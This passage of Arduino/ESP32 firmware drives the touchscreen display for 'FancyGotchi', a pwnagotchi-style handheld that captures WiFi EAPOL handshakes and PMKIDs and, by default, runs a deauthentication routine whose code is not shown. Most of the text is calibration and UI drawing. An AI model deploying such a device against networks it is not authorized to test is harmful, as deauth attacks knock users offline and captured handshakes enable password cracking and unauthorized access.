  _cal.yMin=_calPrefs.getShort("y0",300); _cal.yMax=_calPrefs.getShort("y1",3800);
  _calPrefs.end();
  if (_cal.xMax-_cal.xMin<500||_cal.yMax-_cal.yMin<500) return false;
  _cal.valid=true;
  Serial.printf("[Cal] x=%d..%d y=%d..%d\n",_cal.xMin,_cal.xMax,_cal.yMin,_cal.yMax);
  return true;
}

static void calSave() {
  _calPrefs.begin("tcal",false);
  _calPrefs.putBool("v",true);
  _calPrefs.putShort("x0",_cal.xMin); _calPrefs.putShort("x1",_cal.xMax);
  _calPrefs.putShort("y0",_cal.yMin); _calPrefs.putShort("y1",_cal.yMax);
  _calPrefs.end();
}

// Forward declarations needed for calibration functions
static TFT_eSPI tft;
static SPIClass touchSPI(VSPI);
static XPT2046_Touchscreen ts(TOUCH_CS, TOUCH_IRQ);

static void _drawTarget(int16_t x, int16_t y, uint16_t col) {
  tft.drawCircle(x,y,14,col); tft.drawCircle(x,y,4,col);
  tft.drawFastHLine(x-22,y,8,col); tft.drawFastHLine(x+14,y,8,col);
  tft.drawFastVLine(x,y-22,8,col); tft.drawFastVLine(x,y+14,8,col);
}

static TS_Point _waitTap() {
  uint32_t t=millis()+1500;
  while (millis()<t&&ts.tirqTouched()&&ts.touched()) delay(20);
  delay(80);
  t=millis()+25000;
  while (millis()<t) {
    if (ts.tirqTouched()&&ts.touched()) {
      int32_t ax=0,ay=0; uint8_t n=0;
      for (uint8_t i=0;i<10;i++) {
        if (ts.touched()) { TS_Point p=ts.getPoint(); if (p.z>100&&p.x>50&&p.x<4050){ax+=p.x;ay+=p.y;n++;} }
        delay(8);
      }
      if (n>=5) {
        TS_Point r; r.x=ax/n; r.y=ay/n; r.z=500;
        Serial.printf("[Cal] tap x=%d y=%d n=%d\n",r.x,r.y,n);
        while(ts.tirqTouched()&&ts.touched()) delay(20);
        delay(200); return r;
      }
    }
    delay(20);
  }
  TS_Point fb; fb.x=2048; fb.y=2048; fb.z=0; return fb;
}

static void runCalibration(int16_t W, int16_t H) {
  Serial.println("[Cal] Running calibration");
  const uint8_t M=22;
  struct { int16_t x,y; } pts[3]={{M,M},{W-M,H-M},{W-M,M}};
  int16_t rx[3],ry[3];
  for (uint8_t i=0;i<3;i++) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(TFT_WHITE,TFT_BLACK);
    char buf[24]; snprintf(buf,24,"Tap point %d / 3",i+1);
    tft.drawString(buf,W/2,H/2); tft.setTextFont(1);
    tft.drawString("Tap the circle firmly",W/2,H/2+18);
    _drawTarget(pts[i].x,pts[i].y,TFT_RED); delay(300);
    TS_Point p=_waitTap(); rx[i]=p.x; ry[i]=p.y;
    _drawTarget(pts[i].x,pts[i].y,TFT_GREEN); delay(400);
  }
  _cal.xMin=min({rx[0],rx[1],rx[2]})-60; _cal.xMax=max({rx[0],rx[1],rx[2]})+60;
  _cal.yMin=min({ry[0],ry[1],ry[2]})-60; _cal.yMax=max({ry[0],ry[1],ry[2]})+60;
  _cal.valid=true; calSave();
  tft.fillScreen(TFT_BLACK); tft.setTextDatum(MC_DATUM); tft.setTextFont(2);
  tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawString("Calibration saved!",W/2,H/2-10);
  tft.setTextFont(1); tft.setTextColor(TFT_WHITE,TFT_BLACK);
  char buf[40]; snprintf(buf,40,"x:%d-%d  y:%d-%d",_cal.xMin,_cal.xMax,_cal.yMin,_cal.yMax);
  tft.drawString(buf,W/2,H/2+10); delay(1800);
}

static bool touchCalInit(int16_t W, int16_t H) {
  if (calLoad()) return true;
  runCalibration(W,H); return false;
}
static void touchCalForce(int16_t W, int16_t H) {
  _calPrefs.begin("tcal",false); _calPrefs.putBool("v",false); _calPrefs.end();
  runCalibration(W,H);
}
static void touchMap(int16_t rx, int16_t ry, int16_t& sx, int16_t& sy, int16_t W, int16_t H) {
  sx=(int16_t)constrain(map(rx,_cal.xMin,_cal.xMax,0,W),0,W);
  sy=(int16_t)constrain(map(ry,_cal.yMin,_cal.yMax,0,H),0,H);
}

// ================================================================
// fancygotchi_cyd.ino — main sketch
// ================================================================
#define SCR_W  320
#define SCR_H  240

#define TOPBAR_H   22
#define BOTBAR_Y  202
#define DIVIDER_X 198

#define LP_W  DIVIDER_X
#define LP_H  (BOTBAR_Y - TOPBAR_H)
#define LP_X  0
#define LP_Y  TOPBAR_H
#define WP_W  (SCR_W - DIVIDER_X - 1)
#define WP_H  (BOTBAR_Y - TOPBAR_H)
#define WP_X  (DIVIDER_X + 1)
#define WP_Y  TOPBAR_H
#define BB_Y  BOTBAR_Y
#define BB_H  (SCR_H - BOTBAR_Y)

#define FACE_CX     99
#define FACE_SPR_W 180
#define FACE_SPR_H  30
#define FACE_SPR_X   9
#define FACE_SPR_Y  (TOPBAR_H + 18)

#define STATUS_Y   (TOPBAR_H + 55)
#define MOOD_Y     (TOPBAR_H + 85)
#define BARS_Y     (TOPBAR_H + 99)
#define BAR_X       20
#define BAR_W      172
#define BAR_H        7
#define BAR_SP      14

#define WID_X      (DIVIDER_X + 4)
#define WID_Y      (TOPBAR_H + 4)
#define WID_SP      22

// tft, touchSPI, ts declared above in touch_calibrate section
TFT_eSprite faceSpr(&tft);
bool        fontLoaded = false;

unsigned long lastDraw=0, lastAnim=0;
bool redrawAll = true;

enum Mood { MOOD_IDLE, MOOD_SCANNING, MOOD_EXCITED, MOOD_HAPPY,
            MOOD_INTENSE, MOOD_BORED, MOOD_SLEEP };

static const char* MOODS_STR[] = {
  "idle","scanning","excited!","happy","intense","bored","sleepy"
};
static const char* STATUS_MSGS[][3] = {
  { "waiting...",       "nothing yet",       "all quiet"         },
  { "scanning...",      "sniffing air",      "watching channels" },
  { "got one!!!",       "handshake!!!",      "EAPOL captured!"   },
  { "pwned it :)",      "nice catch",        "saved to SD"       },
  { "many APs around",  "busy out here",     "lots of traffic"   },
  { "slow day...",      "nothing happening", "where's the WiFi?" },
  { "zzz...",           "napping",           "wake me up"        },
};

char     displayFace[48]  = "(^‿‿^)";
char     displayStatus[48]= "booting...";
char     displayMood[16]  = "idle";
uint8_t  moodFrameIdx     = 0;
Mood     currentMood      = MOOD_IDLE;
uint32_t lastMoodChange   = 0;
uint32_t lastCapture      = 0;
uint32_t bootTime         = 0;

char     dFace[48]    = "";
char     dStatus[48]  = "";
char     dMood[16]    = "";
uint32_t dAPs=0xFFFFFFFF, dEapol=0xFFFFFFFF, dPmkid=0xFFFFFFFF;
uint32_t dPwned=0xFFFFFFFF, dPkts=0xFFFFFFFF, dCh=0xFFFFFFFF;
char     dSdStatus[32] = "";
uint8_t  dTheme=0xFF, dFaceSet=0xFF;

uint32_t lastTouchMs  = 0;
bool     deauthEnabled = true;

void ledRGB(bool r,bool g,bool b) {
  digitalWrite(PIN_LED_R,!r); digitalWrite(PIN_LED_G,!g); digitalWrite(PIN_LED_B,!b);
}
void ledFlash(bool r,bool g,bool b,uint16_t ms=80) { ledRGB(r,g,b); delay(ms); ledRGB(false,false,false); }

void updateMood() {
  uint32_t now=millis(), uptime=(now-bootTime)/1000;
  uint32_t eapol=captureEapol(), pkts=capturePackets(); uint8_t aps=captureApCount();
  Mood newMood;
  if      (uptime<5)                             newMood=MOOD_IDLE;
  else if (now-lastCapture<3000  && eapol>0)     newMood=MOOD_EXCITED;
  else if (now-lastCapture<15000 && eapol>0)     newMood=MOOD_HAPPY;
  else if (pkts>500 && aps>8)                    newMood=MOOD_INTENSE;
  else if (aps>0 && pkts>50)                     newMood=MOOD_SCANNING;
  else if (uptime>120 && aps==0)                 newMood=MOOD_SLEEP;
  else if (uptime>60  && eapol==0)               newMood=MOOD_BORED;
  else                                           newMood=MOOD_SCANNING;

  if (newMood!=currentMood||now-lastMoodChange>8000) {
    currentMood=newMood; lastMoodChange=now; moodFrameIdx=(moodFrameIdx+1)%3;
    const char** faces;
    switch(currentMood){
      case MOOD_IDLE:     faces=(const char**)activeFaceSet()->idle;    break;
      case MOOD_SCANNING: faces=(const char**)activeFaceSet()->scan;    break;
      case MOOD_EXCITED:  faces=(const char**)activeFaceSet()->excited; break;
      case MOOD_HAPPY:    faces=(const char**)activeFaceSet()->happy;   break;
      case MOOD_INTENSE:  faces=(const char**)activeFaceSet()->intense; break;
      case MOOD_BORED:    faces=(const char**)activeFaceSet()->bored;   break;
      case MOOD_SLEEP:    faces=(const char**)activeFaceSet()->sleep;   break;
      default:            faces=(const char**)activeFaceSet()->scan;    break;
    }
    strlcpy(displayFace,  faces[moodFrameIdx],                    sizeof(displayFace));
    strlcpy(displayStatus,STATUS_MSGS[currentMood][moodFrameIdx], sizeof(displayStatus));
    strlcpy(displayMood,  MOODS_STR[currentMood],                 sizeof(displayMood));
  }
}

float moodExcited() { uint32_t a=(millis()-lastCapture)/1000; return constrain(1.0f-a/30.0f,0.0f,1.0f); }
float moodBored()   { uint32_t a=(millis()-lastCapture)/1000; return constrain(a/120.0f,0.0f,1.0f); }
float moodTired()   { return constrain((millis()-bootTime)/3600000.0f,0.0f,1.0f); }
float moodHopeful() { return constrain((float)captureApCount()/20.0f,0.0f,1.0f); }

void drawChrome() {
  const ThemeColors& c=activeTheme()->c;
  tft.fillScreen(c.bg);
  tft.fillRect(0,0,SCR_W,TOPBAR_H,c.panel);
  tft.drawFastHLine(0,TOPBAR_H,SCR_W,c.accent);
  tft.setTextFont(FONT_TOPBAR); tft.setTextSize(FONT_TOPBAR_SIZE); tft.setTextDatum(TL_DATUM);
  tft.setTextColor(c.accent,c.panel); tft.drawString("FancyGotchi",4,4);
  tft.setTextColor(c.ok,c.panel);     tft.drawString("[CYD]",96,4);
  tft.drawFastVLine(DIVIDER_X,TOPBAR_H+1,BOTBAR_Y-TOPBAR_H-1,c.accent);
  tft.fillRect(DIVIDER_X+1,TOPBAR_H+1,SCR_W-DIVIDER_X-1,BOTBAR_Y-TOPBAR_H-1,c.panel);
  tft.setTextFont(FONT_STATS); tft.setTextSize(FONT_STATS_SIZE); tft.setTextDatum(TL_DATUM);
  tft.setTextColor(c.textDim,c.panel);
  tft.drawString("APs",  WID_X,WID_Y);
  tft.drawString("EAPOL",WID_X,WID_Y+WID_SP);
  tft.drawString("PMKID",WID_X,WID_Y+WID_SP*2);
  tft.drawString("Pwned",WID_X,WID_Y+WID_SP*3);
  int16_t dY=WID_Y+WID_SP*4+2;
  tft.drawFastHLine(WID_X,dY,SCR_W-WID_X-2,c.accent);
  tft.setTextFont(FONT_LABEL); tft.setTextDatum(TC_DATUM);
  tft.setTextColor(c.accent,c.panel);
  char tb[22]; snprintf(tb,22,"<%s>",activeThemeName()); tft.drawString(tb,(DIVIDER_X+SCR_W)/2,dY+4);
  char fb[22]; snprintf(fb,22,"{%s}",activeFaceSetName()); tft.drawString(fb,(DIVIDER_X+SCR_W)/2,dY+13);
  tft.setTextColor(c.textDim,c.panel);
  tft.drawString("^L:theme ^R:face",  (DIVIDER_X+SCR_W)/2,dY+22);
  tft.drawString("vL:web   vR:deauth",(DIVIDER_X+SCR_W)/2,dY+31);
  tft.setTextFont(FONT_LABEL); tft.setTextSize(FONT_LABEL_SIZE); tft.setTextDatum(TR_DATUM);
  tft.setTextColor(c.textDim,c.bg);
  tft.drawString("exc",BAR_X-2,BARS_Y);
  tft.drawString("brd",BAR_X-2,BARS_Y+BAR_SP);
  tft.drawString("trd",BAR_X-2,BARS_Y+BAR_SP*2);
  tft.drawString("hop",BAR_X-2,BARS_Y+BAR_SP*3);
  tft.fillRect(0,BOTBAR_Y,SCR_W,SCR_H-BOTBAR_Y,c.panel);
  tft.drawFastHLine(0,BOTBAR_Y,SCR_W,c.accent);
  tft.setTextFont(FONT_BOTBAR); tft.setTextDatum(TL_DATUM);
  tft.setTextColor(c.textDim,c.panel); tft.drawString("pkts:",4,BOTBAR_Y+4);
  tft.setTextDatum(TR_DATUM); tft.drawString("v2.0",SCR_W-3,BOTBAR_Y+4);
  if (activeTheme()->corners) {
    uint16_t a=c.accent; uint8_t s=8;
    tft.drawFastHLine(0,      0,      s,a); tft.drawFastVLine(0,      0,      s,a);
    tft.drawFastHLine(SCR_W-s,0,      s,a); tft.drawFastVLine(SCR_W-1,0,      s,a);
    tft.drawFastHLine(0,      SCR_H-1,s,a); tft.drawFastVLine(0,      SCR_H-s,s,a);
    tft.drawFastHLine(SCR_W-s,SCR_H-1,s,a); tft.drawFastVLine(SCR_W-1,SCR_H-s,s,a);
  }
  if (activeTheme()->scanlines)
    for (int16_t y=TOPBAR_H+1;y<BOTBAR_Y;y+=2)
      tft.drawFastHLine(0,y,DIVIDER_X,tft.alphaBlend(30,TFT_BLACK,c.bg));
  faceSpr.deleteSprite();
  faceSpr.createSprite(FACE_SPR_W,FACE_SPR_H);
  faceSpr.setColorDepth(16);
  dFace[0]=dStatus[0]=dMood[0]=dSdStatus[0]='\0';
  dAPs=dEapol=dPmkid=dPwned=dPkts=dCh=0xFFFFFFFF;
}

#define FIELD(x,y,w,h,bg) tft.fillRect(x,y,w,h,bg)

void updateDynamic() {
  const ThemeColors& c=activeTheme()->c;
  if (strcmp(displayFace,dFace)!=0) {
    strlcpy(dFace,displayFace,sizeof(dFace));
    faceSpr.fillSprite(c.bg); faceSpr.setTextDatum(MC_DATUM);
    faceSpr.setTextColor(c.face,c.bg); faceSpr.setTextSize(FONT_FACE_SIZE); faceSpr.setTextFont(FONT_FACE);
    faceSpr.drawString(displayFace,FACE_SPR_W/2,FACE_SPR_H/2); faceSpr.pushSprite(FACE_SPR_X,FACE_SPR_Y);
  }
  if (strcmp(displayStatus,dStatus)!=0) {
    strlcpy(dStatus,displayStatus,sizeof(dStatus));
    FIELD(0,STATUS_Y,DIVIDER_X,18,c.bg);
    tft.setTextFont(FONT_STATUS); tft.setTextSize(FONT_STATUS_SIZE); tft.setTextDatum(TC_DATUM);
    tft.setTextColor(c.text,c.bg); tft.drawString(displayStatus,FACE_CX,STATUS_Y);
  }
  if (strcmp(displayMood,dMood)!=0) {
    strlcpy(dMood,displayMood,sizeof(dMood));
    FIELD(0,MOOD_Y,DIVIDER_X,10,c.bg);
    tft.setTextFont(FONT_MOOD); tft.setTextDatum(TC_DATUM); tft.setTextColor(c.textDim,c.bg);
    char buf[28]; snprintf(buf,28,"mood: %s",displayMood); tft.drawString(buf,FACE_CX,MOOD_Y);
  }
  {
    auto bar=[&](int16_t y,float v,uint16_t fc){
      v=constrain(v,0.0f,1.0f); int16_t f=(int16_t)(v*BAR_W);
      if(f>0)    tft.fillRect(BAR_X,    y,f,      BAR_H,fc);
      if(f<BAR_W)tft.fillRect(BAR_X+f, y,BAR_W-f,BAR_H,c.barBg);
    };
    bar(BARS_Y,          moodExcited(),c.ok);
    bar(BARS_Y+BAR_SP,   moodBored(),  c.textDim);
    bar(BARS_Y+BAR_SP*2, moodTired(),  c.err);
    bar(BARS_Y+BAR_SP*3, moodHopeful(),c.barFill);
  }
  auto wnum=[&](uint32_t v,uint32_t& cache,int16_t y,uint16_t col){
    if(v==cache)return; cache=v;
    FIELD(WID_X+32,y,SCR_W-WID_X-32,15,c.panel);
    tft.setTextFont(FONT_STATS); tft.setTextSize(FONT_STATS_SIZE); tft.setTextDatum(TR_DATUM);
    tft.setTextColor(col,c.panel); char buf[12]; snprintf(buf,12,"%lu",v); tft.drawString(buf,SCR_W-4,y);
  };
  wnum(captureApCount(),dAPs,  WID_Y,         c.text);
  wnum(captureEapol(),  dEapol,WID_Y+WID_SP,  captureEapol()>0 ?c.ok:c.text);
  wnum(capturePmkid(),  dPmkid,WID_Y+WID_SP*2,capturePmkid()>0 ?c.ok:c.text);
  wnum(capturePwned(),  dPwned,WID_Y+WID_SP*3,capturePwned()>0 ?c.accent:c.text);
  uint32_t ch=captureChannel();
  if (ch!=dCh){
    dCh=ch; FIELD(152,4,100,14,c.panel);
    tft.setTextFont(FONT_STATS); tft.setTextSize(FONT_STATS_SIZE); tft.setTextDatum(TL_DATUM);
    tft.setTextColor(c.textDim,c.panel);
    char buf[20]; snprintf(buf,20,"CH:%02d D:%lu",ch,captureDeauth()%1000); tft.drawString(buf,154,4);
  }
  uint32_t pkts=capturePackets();
  if (pkts!=dPkts){
    dPkts=pkts; FIELD(30,BB_Y+3,110,11,c.panel);
    tft.setTextFont(FONT_BOTBAR); tft.setTextDatum(TL_DATUM); tft.setTextColor(c.textDim,c.panel);
    char buf[16]; snprintf(buf,16,"%lu",pkts); tft.drawString(buf,32,BB_Y+5);
  }
  const char* ss=sdGetStatus();
  if (strcmp(ss,dSdStatus)!=0){
    strlcpy(dSdStatus,ss,sizeof(dSdStatus));
    FIELD(138,BB_Y+2,SCR_W-142,13,c.panel);
    tft.setTextFont(FONT_LABEL); tft.setTextDatum(TC_DATUM);
    tft.setTextColor(sdIsReady()?c.ok:c.err,c.panel); tft.drawString(ss,(138+SCR_W)/2,BB_Y+5);
  }
  if (currentMood==MOOD_EXCITED)  ledRGB(false,true, false);
  else if (captureApCount()>0)    ledRGB(false,false,true);
  else                            ledRGB(false,false,false);
}

void handleTouch() {
  static bool     wasDown  = false;
  static uint32_t lastPoll = 0;
  uint32_t now=millis();
  if (now-lastPoll<20) return; lastPoll=now;
  if (!ts.touched()){wasDown=false;return;}
  TS_Point p=ts.getPoint();
  if (p.z<50||p.x<100||p.x>3900||p.y<100||p.y>3900){wasDown=false;return;}
  if (wasDown) return;
  if (now-lastTouchMs<TOUCH_DEBOUNCE_MS) return;
  wasDown=true; lastTouchMs=now;
  int16_t sx,sy; touchMap(p.x,p.y,sx,sy,SCR_W,SCR_H);
  Serial.printf("[Touch] raw(%d,%d) z=%d -> screen(%d,%d)\n",p.x,p.y,p.z,sx,sy);
  if (sy<SCR_H/2) {
    if (sx<SCR_W/2) { themeCycleNext(); redrawAll=true; Serial.printf("[Touch] Theme: %s\n",activeThemeName()); }
    else            { faceSetCycleNext(); redrawAll=true; dFace[0]='\0'; Serial.printf("[Touch] Face: %s\n",activeFaceSetName()); }
  } else if (sx<SCR_W/2) {
    if (webUiIsActive()) webUiStop(); else webUiStart();
    redrawAll=true; Serial.printf("[Touch] Web UI: %s\n",webUiIsActive()?"ON":"OFF");
  } else {
    deauthEnabled=!deauthEnabled; redrawAll=true;
    Serial.printf("[Touch] Deauth: %s\n",deauthEnabled?"ON":"OFF");
  }
}

// ── setup() ───────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200); delay(300);
  Serial.println("\n[FancyGotchi CYD v2.0]");

  pinMode(PIN_LED_R,OUTPUT); pinMode(PIN_LED_G,OUTPUT); pinMode(PIN_LED_B,OUTPUT);
  ledRGB(false,false,true);

  tft.init();
  tft.setRotation(DISPLAY_ROTATION);
  tft.invertDisplay(true);
  tft.fillScreen(TFT_BLACK);
  ledcAttach(PIN_BL,BL_FREQ,BL_BITS);
  ledcWrite(PIN_BL,BL_BRIGHTNESS);
  Serial.println("[boot] TFT ok");

  // Splash screen
  tft.setTextFont(FONT_SPLASH_TITLE); tft.setTextDatum(MC_DATUM);
  tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawString("FancyGotchi",SCR_W/2,80);
  tft.setTextFont(FONT_SPLASH_SUB); tft.setTextColor(TFT_DARKGREY,TFT_BLACK);
  tft.drawString("Standalone Capture Device",SCR_W/2,110);
  tft.setTextFont(FONT_SPLASH_HINT); tft.setTextColor(TFT_YELLOW,TFT_BLACK);
  tft.drawString("Hold screen to calibrate touch",SCR_W/2,134);
  tft.setTextColor(0x4208,TFT_BLACK); tft.drawString("Release to skip  (3 seconds)",SCR_W/2,146);

  // Touch init
  touchSPI.begin(TOUCH_CLK,TOUCH_MISO,TOUCH_MOSI,TOUCH_CS);
  ts.begin(touchSPI); ts.setRotation(1);
  Serial.println("[boot] Touch ok");

  // SPIFFS
  if (SPIFFS.begin(false)) fontLoaded=SPIFFS.exists("/pwna_face.vlw");
  else SPIFFS.begin(true);
  Serial.printf("[boot] SPIFFS ok font=%d\n",fontLoaded);

  // Hold-to-calibrate window (3s)
  bool forceRecal=false;
  uint32_t calEnd=millis()+3000;
  while (millis()<calEnd) {
    if (ts.tirqTouched()&&ts.touched()) {
      TS_Point p=ts.getPoint();
      if (p.z>100&&p.x<4000&&p.y<4000) {
        forceRecal=true;
        tft.fillRect(0,128,SCR_W,22,TFT_BLACK);
        tft.setTextFont(1); tft.setTextDatum(MC_DATUM);
        tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawString("Calibration detected! Release...",SCR_W/2,138);
        while(ts.tirqTouched()&&ts.touched()) delay(20); delay(300); break;
      }
    }
    delay(50);
  }
  if (forceRecal) touchCalForce(SCR_W,SCR_H);
  else            touchCalInit(SCR_W,SCR_H);
  Serial.println("[boot] Cal ok");

  sdInit();
  Serial.println("[boot] SD ok");

  captureInit();
  Serial.println("[boot] Capture started");

  themeInit();
  bootTime=millis(); redrawAll=true; dTheme=0xFF; dFaceSet=0xFF; lastDraw=0; lastAnim=0;
  ledRGB(false,false,false);
  Serial.printf("[boot] DONE  heap=%lu\n",ESP.getFreeHeap());
}

// ── loop() ────────────────────────────────────────────────────────
void loop() {
  uint32_t now=millis();
  handleTouch();
  webUiTick();
  captureChannelTick();
  if (deauthEnabled) deauthTick();

  static uint32_t prevEapol=0;
  uint32_t e=captureEapol();
  if (e!=prevEapol){prevEapol=e;lastCapture=now;ledFlash(false,true,false,60);}

  static uint32_t lastDbg=0;
  if (now-lastDbg>=5000){
    lastDbg=now;
    Serial.printf("[UI] aps=%d eapol=%lu pmkid=%lu pkts=%lu ch=%d mood=%d\n",
      captureApCount(),captureEapol(),capturePmkid(),capturePackets(),captureChannel(),(int)currentMood);
  }

  uint8_t ti=0;
  for(uint8_t i=0;i<THEME_COUNT;i++) if(THEMES[i].name==activeThemeName()){ti=i;break;}
  if(ti!=dTheme){dTheme=ti;redrawAll=true;}
  if(activeFaceSetIdx()!=dFaceSet){dFaceSet=activeFaceSetIdx();redrawAll=true;}

  if(now-lastAnim>=ANIM_FRAME_MS){lastAnim=now;updateMood();}

  if(redrawAll||now-lastDraw>=DRAW_INTERVAL_MS){
    lastDraw=now;
    if(redrawAll){drawChrome();redrawAll=false;}
    updateDynamic();
  }
}
